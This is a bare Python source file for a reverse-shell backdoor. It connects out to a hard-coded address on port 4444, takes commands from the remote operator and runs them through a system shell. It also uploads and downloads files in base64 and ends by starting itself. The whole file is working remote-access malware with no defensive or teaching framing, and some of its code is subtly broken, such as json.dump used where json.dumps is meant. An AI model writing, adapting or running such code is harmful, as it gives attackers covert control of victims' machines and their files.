import socket
import subprocess,json, os, base64, sys

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send(b"[+] Connection Successful\n\n")
    
    def safe_send(self, data):
        self.connection.send(json.dump(data).encode())
    
    def safe_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("UTF-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def change_path(self, path):
        os.chdir(path)
        return "[+] CHanging Path to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] File Was Uploaded Successfuly"

    def run_system_commands(self, command):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def run(self):
        while True:
            command = self.safe_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    self.change_path(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.run_system_commands(command).decode()
            except Exception:
                command_result = "[-] Command Error"
            
            self.safe_send(command_result)

my_backdoor = Backdoor("192.168.1.7", 4444)
my_backdoor.run()